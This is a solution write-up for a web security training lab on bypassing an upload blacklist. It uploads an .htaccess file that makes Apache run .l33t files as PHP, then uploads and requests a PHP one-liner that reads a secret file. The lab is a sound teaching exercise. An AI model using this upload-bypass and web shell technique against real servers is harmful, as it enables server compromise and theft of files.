# Lab: Web shell upload via extension blacklist bypass

## LAB DESC

```
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter


```
## SOLUTION
1. **Upload Configuration Override:**  
   Intercept the avatar upload request (`POST /my-account/avatar`) and upload a `.htaccess` file with `Content-Type: text/plain`:
   ```apache
   AddType application/x-httpd-php .l33t
   ```
This forces Apache to execute .l33t files using the PHP engine.

Upload the file exploit.l33t containing the target script:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
This bypasses the .php extension blacklist while remaining fully executable.

Send a request to GET /files/avatars/exploit.l33t to execute the code and output the file contents.

> Secret: 9DPxQbiY5j7fNjtQx3x1Sw2OOrivSwL3
> LAB SOLVED!
